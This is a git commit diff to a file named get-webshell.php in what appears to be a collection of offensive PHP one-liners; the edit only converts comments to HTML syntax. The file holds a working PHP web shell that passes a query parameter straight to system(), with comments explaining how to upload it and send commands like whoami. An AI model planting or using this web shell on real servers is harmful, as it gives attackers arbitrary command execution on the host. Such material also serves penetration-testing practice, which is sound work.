2256ce0b563d0cf44dffcf76225c323282a09156
Zayd <114421293+partyh4t@users.noreply.github.com>
2024-01-05 20:54:20 -0500

    Update get-webshell.php

--- Scripts/PHP One Liners/get-webshell.php
+++ Scripts/PHP One Liners/get-webshell.php
@@ -1,6 +1,6 @@
-// pass an arbitrary system command via a query parameter
+<!-- pass an arbitrary system command via a query parameter -->
 
 <?php echo system($_GET['command']); ?>
 
-// Once uploaded, use this to pass commands: GET /example/exploit.php?command=whoami HTTP/1.1
+<!-- Once uploaded, use this to pass commands: GET /example/exploit.php?command=whoami HTTP/1.1 -->
 
